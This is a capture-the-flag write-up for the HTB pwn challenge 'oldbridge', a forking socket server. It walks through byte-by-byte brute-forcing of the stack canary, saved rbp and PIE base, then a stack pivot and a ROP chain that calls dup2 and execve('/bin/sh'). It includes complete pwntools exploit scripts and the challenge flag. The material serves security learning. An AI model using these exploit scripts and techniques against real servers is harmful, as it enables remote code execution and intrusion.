For this challenge, we are given an executable *oldbridge* and nothing more. I thought that this was quite an interesting challenge, and so, i've decided to do a writeup of it. Let's dig in.

---
# Program analysis
## main
The program might initially be a bit confusing, as contrary to the majority of pwn challenges on HTB, this file is not hosted by an external program, but by sockets managed by the `main` function of the program.

```c
void main(int param_1,undefined8 *param_2)

{
  int iVar1;
  long in_FS_OFFSET;
  socklen_t local_50;
  undefined4 local_4c;
  int local_48;
  undefined4 local_44;
  int local_40;
  __pid_t local_3c;
  undefined local_38 [4];
  uint32_t local_34;
  sockaddr local_28;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_4c = 1;
  if (param_1 != 2) {
    printf("usage: %s <port>\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_48 = atoi((char *)param_2[1]);
  signal(2,exit_server);
  server_sd = socket(2,1,0);
  if (server_sd < 0) {
    perror("socket");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = setsockopt(server_sd,1,2,&local_4c,4);
  if (iVar1 < 0) {
    perror("setsockopt");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_38._0_2_ = 2;
  local_34 = htonl(0);
  local_38._2_2_ = htons((uint16_t)local_48);
  local_44 = 0x10;
  iVar1 = bind(server_sd,(sockaddr *)local_38,0x10);
  if (iVar1 < 0) {
    perror("bind");
    close(server_sd);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = listen(server_sd,5);
  if (iVar1 < 0) {
    perror("listen");
    close(server_sd);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  signal(0x11,(__sighandler_t)0x1);
  while( true ) {
    local_50 = 0x10;
    local_40 = accept(server_sd,&local_28,&local_50);
    if (local_40 < 0) {
      perror("accept");
      close(server_sd);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_3c = fork();
    if (local_3c < 0) break;
    if (local_3c == 0) {
      iVar1 = check_username();
      if (iVar1 != 0) {
        write(local_40,"Username found!\n",0x10);
      }
      close(local_40);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    close(local_40);
  }
  perror("fork");
  close(local_40);
  close(server_sd);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Overall, function of most of this code is irrelevant to us. The code forks when it receives a connection on the specified fork, after which it executes the `check_username` function, prints if the `check_username` return not 0, and then closes the connection.

## check_username
```c
bool check_username(int param_1)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_1,"Username: ",10);
  sVar2 = read(param_1,local_418,1056);
  for (local_420 = 0; local_420 < (int)sVar2; local_420 = local_420 + 1) {
    local_418[local_420] = local_418[local_420] ^ 0xd;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1 == 0;
}
```

`check_username` is immedietly more akin to what you would find in a traditional challenge. Here, the function takes an input from the user, xors each character by 13, and then compares it to hardcoded value: "il{dih". We also quickly gather, that as a maximum of 1056 characters are stored in a buffer of size 1032, we have a 24 byte overflow, which corresponds to just 3  qwords, as it is a 64-bit executable.

## security measures
With a seeming lack of leaks in the program, one would except the challenge to be devoid of security features. However, one would be wrong, as the executable features the whole suite of security measures, barring full RELRO.

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

However, the way the program is hosted to the user is of great help in this case. As the individual processes serving users are created through forks of the main process, they also inherit a lot from the main process, namely:

- The stack canary
- ASLR address
- PIE address

They are all inherited, as the child process basically stems from a copy of the parent. So while the program may only give us a single attempt to enter user input, we know that these values will carry over between connections.

---
# Leaking values
As we can only overwrite 3 stack values after the buffer, we can immediately conclude what these values will be:

- The stack canary
- The return base pointer
- The return instruction pointer

We know that the return base pointer must be there, as the program makes use of the `leave` instruction, which is essentially equivalent to the following instructions:

```
mov  rsp, rbp
pop  rbp
```

But this still leaves us without a leak to pursue, until we realize, that as we have the control to partially overwrite these values, we should be able to *guess* the values, by inferring the programs response.

Suppose we pass in a value, such that the comparison with "il{dih" succeeds: were the program to crash, we would know that our guessed value was incorrect. But if the program returns "Username found!", we would know the guessed value was correct. Combining this with the partial overwrites, we can effectively reduce the problem down to a small bruteforce. The code for this will be shown further down, before then, i would like to see how this can be applied to all 3 values.

## canary
Applying this to the canary is fairly simple. The canary is comprised of 7 random values, and prefixed with a 0. Thus, we only have to bruteforce 7 characters. If our guess is incorrect, the program will raise a stack fail, and child process will exit.

## Return base pointer
Applying this same trick to the return base pointer might seem troublesome. The program won't just crash if the value is incorrect, it might continue, just with an invalid base pointer. This is not a problem however, due to the fact that the program uses rbp, to access the fd for the user connection. If the rbp is incorrect, an invalid value will be passed, causing the child process to crash.

## Return instruction pointer
Another tricky one, this one could actually cause some problems. However, running the program on repeat, we see that it always ends with the same two bytes: 0x0ecf. This makes it easy, ignoring these last two bytes, any incorrect guess would send the program into non-executable or inaccesible memory, causing the child process to crash.

## Code
```python
from pwn import *

elf = context.binary = ELF("./oldbridge")

HOST = "127.0.0.1"
PORT = 1234

def xor_payload(payload, n):  # Xors entire payload by some number
	return bytes(bytearray((char ^ n for char in payload)))

def leak_value(i, known=b"", prepad=b""):
	leak = bytearray(known)
	
	for _ in range(8 - len(leak)):
		for i in range(256):
			conn = connect(HOST, PORT, timeout=10)
			conn.recvuntil(b"name:")
			
			payload = b"il{dih"  # Initial base to check if the guess is correct
			payload += b"A" * (1032 - len(payload))  # Padding to reach desired value
			payload += prepad  # Add prepad such as canary
			payload += leak  # Add known leaked part
			payload += i.to_bytes(1, "big")[:1]  # Add guess
			payload = xor_payload(payload, 13)  # XOR entire payload
			
			conn.send(payload)
			
			try:
				res = conn.recvline()
				
				if b"found!" in res:
					print(f"New byte: {hex(i)}")
					leak.append(i)
					break
			except:
				pass
			
			conn.close()
		else:
			print("Error!")
			exit()
	
	return u64(leak)

canary = leak_value(0, (0, ))
print(f"Leaked stack canary {hex(canary)}")

stack_rbp = leak_value(1, prepad=p64(canary))
print(f"Leaked stack rbp {hex(stack_rbp)}")

rip = leak_value(2, (0xcf, 0x0e), p64(canary) + p64(stack_rbp))
elf.address = rip - 0x0ecf
print(f"Leaked PIE base {hex(elf.address)}")
```

The following code will leak the three discussed values. When running locally, the program must be running on port 1234. Remotelly, it struggles due to internet stuff, but as the values remain consistent between runs, we can slowly build these values until we have the complete thing.

---
# Exploitation
With these values leaked, we can start working on our exploit. That might initially seem hard to do, as the program only allows us do one return. With the limited space available, we must *pivot* to other techniques.

## Stack pivot
As discussed earlier, `leave` can be translated into the following code:

```
mov  rsp, rbp
pop  rbp
```

What one might notice, is that we have complete control over what value gets put into rbp. One type of stack pivot, works by using this overwrite to our advantage. Say we overwrite the return base pointer with some value, then overwrite rip as to return to another `leave; ret;`, the following would happen:

- Attacker controlled value gets written into rbp
- Program returns to `leave; ret;`
- Attacker controlled rbp gets written into rsp
- rsp gets incremented, value at attacker controlled address gets written into rbp

And with that, rsp has been overwritten, stack has been pivoted. We don't have to concern ourselves with the second value written to rbp, we won't be using it anymore.

As to where to pivot, we can simply pivot back to the beginning of our user input, and plant our payload there.

## execve("/bin/sh")
As we have plenty of space, i have opted to use an execve("/bin/sh") call in favor of a ret2libc. The following code will attempt such an exploit:

```python
from pwn import *

elf = context.binary = ELF("./oldbridge")

HOST = "127.0.0.1"
PORT = 1234

def xor_payload(payload, n):  # Xors entire payload by some number
	return bytes(bytearray((char ^ n for char in payload)))

def leak_value(i, known=b"", prepad=b""):
	leak = bytearray(known)
	
	for _ in range(8 - len(leak)):
		for i in range(256):
			conn = connect(HOST, PORT, timeout=10)
			conn.recvuntil(b"name:")
			
			payload = b"il{dih"  # Initial base to check if the guess is correct
			payload += b"A" * (1032 - len(payload))  # Padding to reach desired value
			payload += prepad  # Add prepad such as canary
			payload += leak  # Add known leaked part
			payload += i.to_bytes(1, "big")[:1]  # Add guess
			payload = xor_payload(payload, 13)  # XOR entire payload
			
			conn.send(payload)
			
			try:
				res = conn.recvline()
				
				if b"found!" in res:
					print(f"New byte: {hex(i)}")
					leak.append(i)
					break
			except:
				pass
			
			conn.close()
		else:
			print("Error!")
			exit()
	
	return u64(leak)

def execute_rop(payload):
	pivot_lock = stack_rbp - 0x480  # Location to pivot to, pointing at the beginning of user input
	
	payload += b"A" * (1032 - len(payload))
	payload += p64(canary)
	payload += p64(pivot_lock)
	payload += p64(rop.leave.address)
	payload = xor_payload(payload, 13)
	
	conn = connect(HOST, PORT, timeout=10)
	conn.recvuntil(b"name:")
	
	conn.send(payload)
	return conn

canary = leak_value(0, (0, ))
print(f"Leaked stack canary {hex(canary)}")

stack_rbp = leak_value(1, prepad=p64(canary))
print(f"Leaked stack rbp {hex(stack_rbp)}")

rip = leak_value(2, (0xcf, 0x0e), p64(canary) + p64(stack_rbp))
elf.address = rip - 0x0ecf
print(f"Leaked PIE base {hex(elf.address)}")

rop = ROP(elf)
payload = b"/bin/sh\x00"  # Value to point execve to
payload += p64(rop.rsi.address)  # pop rsi; pop 15; ret
payload += p64(0) * 2
payload += p64(rop.rax.address)
payload += p64(59)  # Syscall for execve
payload += p64(rop.rdi.address)
payload += p64(stack_rbp - 0x480)  # Will point back to /bin/sh
payload += p64(rop.rdx.address)
payload += p64(0)
payload += p64(rop.syscall.address)

conn = execute_rop(payload)
conn.interactive()
```

Running this code locally, and we get a shell! But not where we would expect it. The shell actually popped on the host, not on the client.

What's going here? Well, HTB pwn challenges are usually built to automatically redirect stdin and stdout to the client connection, meaning we can control the shell. But that is not a given, and as we can see here, when stdin and stdout is not redirected, the shell will pop on the server.

I thought this would take long to fix, as i had never encountered this before, but after a bit of googling, you would arrive at the dup2 syscall. dup2 takes a file descriptor, and replaces it with another. If we were to debug the program in gdb, and check the file descriptor that the program uses to communicate with the user, we would find that the default value is 4. Assuming this is the same on the server, we can create a final solution, that will redirect stdin and stdout to the client, popping a shell remotely.

---
# Final solution
With this small modification, our final code looks like this:

```python
from pwn import *

elf = context.binary = ELF("./oldbridge")

HOST = "127.0.0.1"
PORT = 1234

def xor_payload(payload, n):  # Xors entire payload by some number
	return bytes(bytearray((char ^ n for char in payload)))

def leak_value(i, known=b"", prepad=b""):
	leak = bytearray(known)
	
	for _ in range(8 - len(leak)):
		for i in range(256):
			conn = connect(HOST, PORT, timeout=10)
			conn.recvuntil(b"name:")
			
			payload = b"il{dih"  # Initial base to check if the guess is correct
			payload += b"A" * (1032 - len(payload))  # Padding to reach desired value
			payload += prepad  # Add prepad such as canary
			payload += leak  # Add known leaked part
			payload += i.to_bytes(1, "big")[:1]  # Add guess
			payload = xor_payload(payload, 13)  # XOR entire payload
			
			conn.send(payload)
			
			try:
				res = conn.recvline()
				
				if b"found!" in res:
					print(f"New byte: {hex(i)}")
					leak.append(i)
					break
			except:
				pass
			
			conn.close()
		else:
			print("Error!")
			exit()
	
	return u64(leak)

def execute_rop(payload):
	pivot_lock = stack_rbp - 0x480  # Location to pivot to, pointing at the beginning of user input
	
	payload += b"A" * (1032 - len(payload))
	payload += p64(canary)
	payload += p64(pivot_lock)
	payload += p64(rop.leave.address)
	payload = xor_payload(payload, 13)
	
	conn = connect(HOST, PORT, timeout=10)
	conn.recvuntil(b"name:")
	
	conn.send(payload)
	return conn

canary = leak_value(0, (0, ))
print(f"Leaked stack canary {hex(canary)}")

stack_rbp = leak_value(1, prepad=p64(canary))
print(f"Leaked stack rbp {hex(stack_rbp)}")

rip = leak_value(2, (0xcf, 0x0e), p64(canary) + p64(stack_rbp))
elf.address = rip - 0x0ecf
print(f"Leaked PIE base {hex(elf.address)}")

rop = ROP(elf)
payload = b"/bin/sh\x00"  # Value to point execve to

payload += p64(rop.rdi.address)
payload += p64(4)  # Client connection
payload += p64(rop.rsi.address)  # pop rsi; pop r15; ret;
payload += p64(1) * 2  # stdout
payload += p64(rop.rax.address)
payload += p64(33)  # dup2 syscall
payload += p64(rop.syscall.address)

payload += p64(rop.rdi.address)
payload += p64(4)  # Client connection
payload += p64(rop.rsi.address)  # pop rsi; pop r15; ret;
payload += p64(0) * 2  # stdin
payload += p64(rop.rax.address)
payload += p64(33)  # dup2 syscall
payload += p64(rop.syscall.address)

payload += p64(rop.rsi.address)  # pop rsi; pop r15; ret;
payload += p64(0) * 2
payload += p64(rop.rax.address)
payload += p64(59)  # Syscall for execve
payload += p64(rop.rdi.address)
payload += p64(stack_rbp - 0x480)  # Will point back to /bin/sh
payload += p64(rop.rdx.address)
payload += p64(0)
payload += p64(rop.syscall.address)

conn = execute_rop(payload)
conn.interactive()
```

Trying this locally, it will pop a shell. Trying it remotely, well, connection issues. The program is likely to fail before leaking all values. Importantly, we can simply add the known values to our script, and run it again, as the leaked values will be the same. Running the program - several times - we finally obtain a shell and the flag: `HTB{q4i1q3_i1i3_p0a_a01}`.